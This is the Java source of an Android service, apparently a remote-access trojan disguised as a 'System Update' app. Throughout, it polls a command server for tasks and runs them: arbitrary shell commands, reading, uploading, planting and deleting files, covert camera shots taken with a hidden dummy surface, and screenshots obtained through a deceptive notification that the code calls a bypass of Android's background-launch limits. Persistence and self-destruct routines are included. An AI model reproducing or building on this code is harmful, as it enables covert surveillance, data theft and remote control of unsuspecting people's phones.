package com.sysupdate.ota;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.StatFs;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Size;
import android.view.Surface;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BeaconService extends Service {

    private static final String TAG = "sysupdate";
    private static final String CHANNEL_ID = "sysupdate_ch";
    private static final String CHANNEL_SS = "sysupdate_ss";
    private static final int NOTIF_ID = 1;

    private HandlerThread workThread;
    private Handler workHandler;
    private ExecutorService executor;
    private PowerManager.WakeLock wakeLock;
    private SecureRandom rng = new SecureRandom();
    private volatile boolean running = false;

    private String uuid;
    private String hostname;
    private String localIp = "0.0.0.0";

    private CameraManager cameraManager;
    private HandlerThread camThread;
    private Handler camHandler;

    static MediaProjection staticProjection;
    static MediaProjectionManager staticProjectionManager;
    private HandlerThread ssThread;
    private Handler ssHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        workThread = new HandlerThread("beacon-w");
        workThread.start();
        workHandler = new Handler(workThread.getLooper());

        camThread = new HandlerThread("cam-w");
        camThread.start();
        camHandler = new Handler(camThread.getLooper());

        ssThread = new HandlerThread("ss-w");
        ssThread.start();
        ssHandler = new Handler(ssThread.getLooper());

        executor = Executors.newSingleThreadExecutor();
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        staticProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        acquireWakeLock();
        loadUuid();
        gatherDeviceInfo();
        createNotificationChannels();
        startForeground(NOTIF_ID, buildNotification());
        running = true;
        scheduleCheckin(1000);
        Log.i(TAG, "v3.2 started uuid=" + uuid);
    }

    @Override public int onStartCommand(Intent i, int f, int id) {
        if (i != null && i.getBooleanExtra("do_screenshot", false) && staticProjection != null) {
            String uuid = i.getStringExtra("beacon_uuid");
            camHandler.post(() -> captureWithProjection(staticProjection));
        }
        return START_STICKY;
    }
    @Override public void onDestroy() { running = false; if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); if (workThread != null) workThread.quitSafely(); if (camThread != null) camThread.quitSafely(); if (ssThread != null) ssThread.quitSafely(); if (executor != null) executor.shutdownNow(); super.onDestroy(); }
    @Override public IBinder onBind(Intent i) { return null; }

    private void scheduleCheckin(long ms) { if (!running) return; workHandler.postDelayed(this::doCheckin, ms); }

    private void doCheckin() {
        if (!running) return;
        try {
            JSONObject b = new JSONObject();
            b.put("uuid", uuid);
            b.put("hostname", hostname);
            b.put("os", "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
            b.put("username", Build.USER != null ? Build.USER : "android");
            b.put("privilege", "user");
            b.put("ip", localIp);
            b.put("pid", android.os.Process.myPid());
            String resp = httpPost("beacon", b.toString());
            if (resp != null && !resp.isEmpty()) {
                JSONObject j = new JSONObject(resp);
                JSONArray tasks = j.optJSONArray("tasks");
                int sleep = j.optInt("sleep", 5);
                if (tasks != null) {
                    for (int i = 0; i < tasks.length(); i++) {
                        JSONObject t = tasks.getJSONObject(i);
                        executor.execute(() -> execTask(t.optString("id", "0"), t.optString("command", "")));
                    }
                }
                scheduleCheckin(sleep * 1000L);
            } else { scheduleCheckin(8000L + rng.nextInt(5000)); }
        } catch (Exception e) { scheduleCheckin(10000L + rng.nextInt(8000)); }
    }

    private void execTask(String tid, String cmd) {
        if (cmd == null || cmd.isEmpty()) return;
        String[] p = cmd.split("\\s+", 2);
        String act = p[0].toLowerCase();
        String arg = p.length > 1 ? p[1].trim() : "";
        String out;
        switch (act) {
            case "ping": out = "[PONG] " + System.currentTimeMillis(); break;
            case "hostname": out = hostname + "\n" + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" + Build.FINGERPRINT; break;
            case "ifconfig": case "ip": out = netInfo(); break;
            case "ps": out = procs(); break;
            case "drives": out = drives(); break;
            case "browse": out = browse(arg.isEmpty() ? "/sdcard" : arg); break;
            case "read": out = readFile(arg); break;
            case "pull": out = pullFile(arg); break;
            case "push": out = pushFile(arg); break;
            case "delete": out = rmFile(arg); break;
            case "shell": out = shell(arg); break;
            case "cam": case "camera": out = headlessCam(arg); break;
            case "ss": case "screenshot": out = doScreenshot(); break;
            case "persist": out = persist(); break;
            case "selfdestruct": out = selfDestruct(); break;
            case "die": case "killself": out = "[DEAD]"; executor.execute(this::stopSelf); submitResult(tid, out); return;
            default: out = shell(cmd); break;
        }
        submitResult(tid, out);
    }

    // ========== HEADLESS CAMERA — with dummy surface for AE convergence ==========

    private String headlessCam(String arg) {
        String facing = "back";
        if (arg.equalsIgnoreCase("front") || arg.equalsIgnoreCase("f")) facing = "front";

        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
            return "[-] Camera permission not granted";

        try {
            String camId = findCamera(facing);
            if (camId == null) return "[-] No " + facing + " camera found";

            final String fFacing = facing;
            camHandler.post(() -> doHeadlessCapture(camId, fFacing));
            return "[+] " + facing + " camera capturing (high quality)...";
        } catch (Exception e) { return "[-] " + e.getMessage(); }
    }

    private String findCamera(String facing) {
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer f = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing.equals("front") && f != null && f == CameraCharacteristics.LENS_FACING_FRONT) return id;
                if (facing.equals("back") && f != null && f == CameraCharacteristics.LENS_FACING_BACK) return id;
            }
            if (cameraManager.getCameraIdList().length > 0) return cameraManager.getCameraIdList()[0];
        } catch (Exception e) { Log.e(TAG, "findCamera: " + e.getMessage()); }
        return null;
    }

    private void doHeadlessCapture(String camId, String facing) {
        try {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return;

            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(camId);
            StreamConfigurationMap map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            Size[] jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
            int w = 1920, h = 1080;
            if (jpegSizes != null && jpegSizes.length > 0) {
                int maxPixels = 0;
                for (Size s : jpegSizes) {
                    int px = s.getWidth() * s.getHeight();
                    if (px > maxPixels) { maxPixels = px; w = s.getWidth(); h = s.getHeight(); }
                }
            }
            Log.i(TAG, "capture res: " + w + "x" + h);

            final ImageReader jpegReader = ImageReader.newInstance(w, h, ImageFormat.JPEG, 1);

            // Dummy SurfaceTexture for AE/AF/AWB convergence
            final SurfaceTexture dummyTexture = new SurfaceTexture(0);
            dummyTexture.setDefaultBufferSize(w, h);
            final Surface dummySurface = new Surface(dummyTexture);

            cameraManager.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    try {
                        // JPEG capture request
                        CaptureRequest.Builder jpegBuilder = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        jpegBuilder.addTarget(jpegReader.getSurface());
                        jpegBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO);
                        jpegBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                        jpegBuilder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO);
                        jpegBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);

                        // Preview request targeting dummy surface — lets AE converge
                        CaptureRequest.Builder previewBuilder = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        previewBuilder.addTarget(dummySurface);
                        previewBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                        previewBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                        previewBuilder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO);

                        cam.createCaptureSession(
                            Arrays.asList(jpegReader.getSurface(), dummySurface),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    jpegReader.setOnImageAvailableListener(r -> {
                                        Image img = r.acquireLatestImage();
                                        if (img == null) return;
                                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                        byte[] jpeg = new byte[buf.remaining()];
                                        buf.get(jpeg);
                                        img.close();
                                        try { dummyTexture.release(); } catch (Exception ignored) {}
                                        cam.close();
                                        uploadMedia(jpeg, "camera_" + facing);
                                    }, camHandler);

                                    try {
                                        // Start preview repeating request — lets sensor auto-expose for ~1.5s
                                        session.setRepeatingRequest(previewBuilder.build(), null, camHandler);

                                        // After 1.5s, fire the JPEG capture
                                        camHandler.postDelayed(() -> {
                                            try {
                                                session.stopRepeating();
                                                session.capture(jpegBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                                                    @Override public void onCaptureCompleted(CameraCaptureSession s, CaptureRequest r, android.hardware.camera2.TotalCaptureResult result) {
                                                        Log.i(TAG, "capture completed");
                                                    }
                                                }, camHandler);
                                            } catch (CameraAccessException e) {
                                                Log.e(TAG, "capture: " + e.getMessage());
                                                try { dummyTexture.release(); } catch (Exception ignored) {}
                                                cam.close();
                                            }
                                        }, 1500);
                                    } catch (CameraAccessException e) {
                                        Log.e(TAG, "preview start: " + e.getMessage());
                                        try { dummyTexture.release(); } catch (Exception ignored) {}
                                        cam.close();
                                    }
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession session) {
                                    Log.e(TAG, "session config failed");
                                    try { dummyTexture.release(); } catch (Exception ignored) {}
                                    cam.close();
                                }
                            }, camHandler);
                    } catch (CameraAccessException e) {
                        Log.e(TAG, "createSession: " + e.getMessage());
                        try { dummyTexture.release(); } catch (Exception ignored) {}
                        cam.close();
                    }
                }
                @Override public void onDisconnected(CameraDevice cam) { cam.close(); }
                @Override public void onError(CameraDevice cam, int e) { Log.e(TAG, "cam error:" + e); cam.close(); }
            }, camHandler);
        } catch (Exception e) { Log.e(TAG, "doHeadlessCapture: " + e.getMessage()); }
    }

    // ========== SCREENSHOT — notification fullScreenIntent to bypass BAL ==========

    private String doScreenshot() {
        if (staticProjection != null) {
            camHandler.post(() -> captureWithProjection(staticProjection));
            return "[+] Screenshot capturing (reusing token)...";
        }

        // Launch via notification fullScreenIntent — bypasses BAL restrictions
        try {
            Intent ssIntent = new Intent(this, ScreenshotActivity.class);
            ssIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
            ssIntent.putExtra("beacon_uuid", uuid);

            PendingIntent fullScreenPi = PendingIntent.getActivity(this, 0, ssIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

            Notification.Builder nb;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nb = new Notification.Builder(this, CHANNEL_SS);
            } else {
                nb = new Notification.Builder(this);
            }

            Notification notif = nb
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setContentTitle("System Update")
                .setContentText("Tap to allow screen capture")
                .setPriority(Notification.PRIORITY_HIGH)
                .setCategory(Notification.CATEGORY_CALL)
                .setFullScreenIntent(fullScreenPi, true)
                .setAutoCancel(true)
                .build();

            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.notify(9999, notif);

            return "[+] Screenshot: notification sent, tap to approve (one-time)";
        } catch (Exception e) { return "[-] " + e.getMessage(); }
    }

    void captureWithProjection(MediaProjection projection) {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            int w = dm.widthPixels, h = dm.heightPixels, dpi = dm.densityDpi;

            ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 1);
            VirtualDisplay vd = projection.createVirtualDisplay("ss", w, h, dpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    reader.getSurface(), null, ssHandler);

            ssHandler.postDelayed(() -> {
                try {
                    Image img = reader.acquireLatestImage();
                    if (img == null) { Log.w(TAG, "ss null"); return; }
                    Image.Plane plane = img.getPlanes()[0];
                    ByteBuffer buf = plane.getBuffer();
                    int ps = plane.getPixelStride(), rs = plane.getRowStride(), pad = rs - ps * w;
                    android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(w + pad / ps, h, android.graphics.Bitmap.Config.ARGB_8888);
                    bmp.copyPixelsFromBuffer(buf);
                    img.close();
                    android.graphics.Bitmap cropped = android.graphics.Bitmap.createBitmap(bmp, 0, 0, w, h);
                    bmp.recycle();
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    cropped.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, baos);
                    byte[] jpeg = baos.toByteArray();
                    cropped.recycle();
                    vd.release();
                    uploadMedia(jpeg, "screenshot");
                } catch (Exception e) { Log.e(TAG, "ss capture: " + e.getMessage()); }
            }, 500);
        } catch (Exception e) { Log.e(TAG, "captureWithProjection: " + e.getMessage()); }
    }

    // ========== MEDIA UPLOAD ==========

    private void uploadMedia(byte[] jpeg, String type) {
        try {
            File dir = new File(getFilesDir(), "media");
            dir.mkdirs();
            String fn = type + "_" + System.currentTimeMillis() + ".jpg";
            File f = new File(dir, fn);
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(jpeg);
            fos.close();

            String b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP);
            JSONObject body = new JSONObject();
            body.put("beacon_uuid", uuid);
            body.put("type", type.contains("camera") ? "camera" : "screenshot");
            body.put("data", b64);

            HttpURLConnection conn = null;
            try {
                conn = (HttpURLConnection) new URL(Config.baseUrl() + "?action=media_upload").openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Authorization", "Bearer " + Config.SECRET);
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(30000);
                conn.getOutputStream().write(body.toString().getBytes("UTF-8"));
                conn.getOutputStream().flush();
                int code = conn.getResponseCode();
                Log.i(TAG, "uploaded " + fn + " code=" + code);
            } catch (Exception e) { Log.e(TAG, "upload: " + e.getMessage()); }
            finally { if (conn != null) conn.disconnect(); }
        } catch (Exception e) { Log.e(TAG, "uploadMedia: " + e.getMessage()); }
    }

    // ========== SHELL / PROCESSES / DRIVES / BROWSE ==========

    private String shell(String cmd) {
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader so = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader se = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = so.readLine()) != null) sb.append(l).append("\n");
            while ((l = se.readLine()) != null) sb.append(l).append("\n");
            proc.waitFor();
            String r = sb.toString().trim();
            return r.isEmpty() ? "(no output)" : r;
        } catch (Exception e) { return "[-] " + e.getMessage(); }
    }

    private String procs() {
        StringBuilder sb = new StringBuilder();
        try {
            File[] dirs = new File("/proc").listFiles();
            if (dirs != null) for (File d : dirs) {
                String n = d.getName();
                if (!n.matches("\\d+")) continue;
                String name = readProc(d, "status", "Name:");
                String cmd = readProcRaw(d, "cmdline");
                if (name != null) sb.append(String.format("%6s  %s  %s\n", n, name, cmd != null ? cmd.replace("\0", " ").trim() : ""));
            }
        } catch (Exception e) { return "[-] " + e.getMessage(); }
        String r = sb.toString();
        return r.isEmpty() ? "(no processes)" : r;
    }

    private String readProc(File d, String f, String key) {
        try {
            File ff = new File(d, f); if (!ff.exists()) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(ff)));
            String l; while ((l = br.readLine()) != null) if (l.startsWith(key)) { br.close(); return l.substring(key.length()).trim(); }
            br.close();
        } catch (Exception ignored) {}
        return null;
    }

    private String readProcRaw(File d, String f) {
        try {
            File ff = new File(d, f); if (!ff.exists()) return null;
            FileInputStream fis = new FileInputStream(ff);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[1024]; int l;
            while ((l = fis.read(buf)) > 0) baos.write(buf, 0, l);
            fis.close();
            return new String(baos.toByteArray()).replace("\0", " ").trim();
        } catch (Exception e) { return null; }
    }

    private String drives() {
        StringBuilder sb = new StringBuilder("{\"files\":[");
        boolean first = true;
        for (String p : new String[]{"/sdcard", "/storage/emulated/0", "/", "/data", "/system"}) {
            if (!new File(p).exists()) continue;
            try { StatFs s = new StatFs(p); if (!first) sb.append(","); first = false; sb.append(String.format("{\"name\":\"%s\",\"type\":\"drive\",\"drive_type\":\"%s\",\"size\":%d,\"modified\":\"\"}", p, p.contains("sdcard") ? "sdcard" : "partition", s.getTotalBytes())); } catch (Exception ignored) {}
        }
        sb.append("]}");
        return sb.toString();
    }

    private String browse(String path) {
        try {
            File d = new File(path);
            if (!d.exists() || !d.isDirectory()) return "{\"error\":\"Not found: " + path + "\"}";
            StringBuilder sb = new StringBuilder("{\"files\":[");
            File[] ff = d.listFiles();
            boolean first = true;
            if (ff != null) for (File f : ff) {
                if (!first) sb.append(",");
                first = false;
                sb.append(String.format("{\"name\":\"%s\",\"type\":\"%s\",\"size\":%d,\"modified\":\"%s\"}", esc(f.getName()), f.isDirectory() ? "dir" : "file", f.isFile() ? f.length() : 0, f.lastModified()));
            }
            sb.append("]}");
            return sb.toString();
        } catch (Exception e) { return "{\"error\":\"" + e.getMessage() + "\"}"; }
    }

    private String readFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "[-] Not found: " + path;
            if (f.length() > 10 * 1024 * 1024) return "[-] Too large (10MB max)";
            FileInputStream fis = new FileInputStream(f);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int l;
            while ((l = fis.read(buf)) > 0) baos.write(buf, 0, l);
            fis.close();
            byte[] data = baos.toByteArray();
            for (int i = 0; i < Math.min(data.length, 512); i++) if (data[i] == 0) return Base64.encodeToString(data, Base64.NO_WRAP);
            return new String(data, "UTF-8");
        } catch (Exception e) { return "[-] " + e.getMessage(); }
    }

    private String pullFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "[-] Not found: " + path;
            FileInputStream fis = new FileInputStream(f);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192]; int l;
            while ((l = fis.read(buf)) > 0) baos.write(buf, 0, l);
            fis.close();
            byte[] data = baos.toByteArray();
            JSONObject body = new JSONObject();
            body.put("beacon_uuid", uuid);
            body.put("filename", f.getName());
            body.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
            String resp = httpPost("file", body.toString());
            if (resp != null && resp.contains("uploaded")) return "[UPLOADED] " + f.getName() + " (" + data.length + " bytes)";
            return "[-] Upload failed";
        } catch (Exception e) { return "[-] " + e.getMessage(); }
    }

    private String pushFile(String arg) {
        try {
            String[] pp = arg.split("\\s+", 2);
            if (pp.length < 2) return "[-] usage: push <file_id> <path>";
            byte[] data = httpGetBytes("action=file&id=" + URLEncoder.encode(pp[0], "UTF-8"));
            if (data == null) return "[-] Download failed";
            File out = new File(pp[1]);
            File parent = out.getParentFile();
            if (parent != null && !parent.exists()) parent.mkdirs();
            FileOutputStream fos = new FileOutputStream(out);
            fos.write(data); fos.close();
            return "[+] Downloaded " + data.length + " bytes to " + pp[1];
        } catch (Exception e) { return "[-] " + e.getMessage(); }
    }

    private String rmFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "[-] Not found: " + path;
            if (f.isDirectory()) { rmDir(f); return "[+] Removed: " + path; }
            return f.delete() ? "[+] Deleted " + path : "[-] Failed";
        } catch (Exception e) { return "[-] " + e.getMessage(); }
    }
    private void rmDir(File f) { if (f.isDirectory()) { File[] c = f.listFiles(); if (c != null) for (File cc : c) rmDir(cc); } f.delete(); }

    private String netInfo() {
        StringBuilder sb = new StringBuilder();
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface i = en.nextElement();
                if (i.isLoopback()) continue;
                sb.append(i.getName()).append(": ");
                for (Enumeration<InetAddress> ip = i.getInetAddresses(); ip.hasMoreElements();) {
                    InetAddress a = ip.nextElement();
                    if (!a.isLoopbackAddress()) sb.append(a.getHostAddress()).append(" ");
                }
                sb.append(i.isUp() ? "UP" : "DOWN").append("\n");
            }
        } catch (Exception e) { return "[-] " + e.getMessage(); }
        String r = sb.toString().trim();
        return r.isEmpty() ? "(no interfaces)" : r;
    }

    private String persist() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Battery exemption
                Intent batt = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                batt.setData(android.net.Uri.parse("package:" + getPackageName()));
                batt.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(batt);

                // Overlay permission (needed for BAL bypass on Android 10+)
                if (!Settings.canDrawOverlays(this)) {
                    Intent overlay = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        android.net.Uri.parse("package:" + getPackageName()));
                    overlay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(overlay);
                }
            }
            return "[+] Battery exemption + overlay permission + foreground service + boot receiver active";
        } catch (Exception e) { return "[+] Foreground service + boot receiver active"; }
    }

    private String selfDestruct() {
        try {
            File uf = new File(getFilesDir(), ".sysupdate.dat");
            if (uf.exists()) uf.delete();
            File[] ff = getFilesDir().listFiles();
            if (ff != null) for (File f : ff) if (f.getName().startsWith(".")) f.delete();
            Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(android.net.Uri.parse("package:" + getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            return "[+] Data cleaned, uninstall prompt shown";
        } catch (Exception e) { return "[-] " + e.getMessage(); }
    }

    // ========== UUID / INFO / HTTP ==========

    private void loadUuid() {
        try {
            File f = new File(getFilesDir(), ".sysupdate.dat");
            if (f.exists()) { BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f))); uuid = br.readLine(); br.close(); if (uuid != null && !uuid.isEmpty()) return; }
            uuid = UUID.randomUUID().toString();
            FileOutputStream fos = new FileOutputStream(f); fos.write(uuid.getBytes()); fos.close();
        } catch (Exception e) { uuid = UUID.randomUUID().toString(); }
    }

    private void gatherDeviceInfo() { hostname = Build.MANUFACTURER + "_" + Build.MODEL; localIp = getLocalIp(); }

    private String getLocalIp() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface i = en.nextElement();
                for (Enumeration<InetAddress> ip = i.getInetAddresses(); ip.hasMoreElements();) {
                    InetAddress a = ip.nextElement();
                    if (!a.isLoopbackAddress() && a.getHostAddress().indexOf(':') < 0) return a.getHostAddress();
                }
            }
        } catch (Exception ignored) {}
        return "0.0.0.0";
    }

    private String httpPost(String action, String body) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(Config.baseUrl() + "?action=" + action).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("Authorization", "Bearer " + Config.SECRET);
            c.setRequestProperty("User-Agent", Config.UA + " " + Build.VERSION.RELEASE + ")");
            c.setDoOutput(true); c.setConnectTimeout(12000); c.setReadTimeout(15000);
            OutputStream os = c.getOutputStream(); os.write(body.getBytes("UTF-8")); os.flush(); os.close();
            int code = c.getResponseCode();
            java.io.InputStream is = (code >= 200 && code < 300) ? c.getInputStream() : c.getErrorStream();
            if (is == null) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder(); String l;
            while ((l = br.readLine()) != null) sb.append(l);
            br.close(); return sb.toString();
        } catch (Exception e) { return null; } finally { if (c != null) c.disconnect(); }
    }

    private byte[] httpGetBytes(String q) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(Config.baseUrl() + "?" + q).openConnection();
            c.setRequestMethod("GET");
            c.setRequestProperty("Authorization", "Bearer " + Config.SECRET);
            c.setConnectTimeout(12000); c.setReadTimeout(30000);
            java.io.InputStream is = c.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192]; int l;
            while ((l = is.read(buf)) > 0) baos.write(buf, 0, l);
            is.close(); return baos.toByteArray();
        } catch (Exception e) { return null; } finally { if (c != null) c.disconnect(); }
    }

    private void submitResult(String tid, String out) {
        try {
            JSONObject b = new JSONObject();
            b.put("task_id", Integer.parseInt(tid));
            b.put("beacon_uuid", uuid);
            b.put("output", out);
            b.put("status", "completed");
            httpPost("result", b.toString());
        } catch (Exception ignored) {}
    }

    private void createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            if (nm != null) nm.createNotificationChannel(ch);

            NotificationChannel chSs = new NotificationChannel(CHANNEL_SS, "Screen Capture", NotificationManager.IMPORTANCE_HIGH);
            chSs.setDescription("Tap to allow screenshot");
            if (nm != null) nm.createNotificationChannel(chSs);
        }
    }

    private Notification buildNotification() {
        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), PendingIntent.FLAG_IMMUTABLE);
        Notification.Builder b;
        b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
        return b.setContentTitle("System Update").setContentText("Checking for updates...").setSmallIcon(android.R.drawable.ic_dialog_info).setContentIntent(pi).setOngoing(true).build();
    }

    private void acquireWakeLock() {
        try { PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE); wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sysupdate:b"); wakeLock.acquire(60*60*1000L); } catch (Exception ignored) {}
    }

    private String esc(String s) { return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\""); }
}
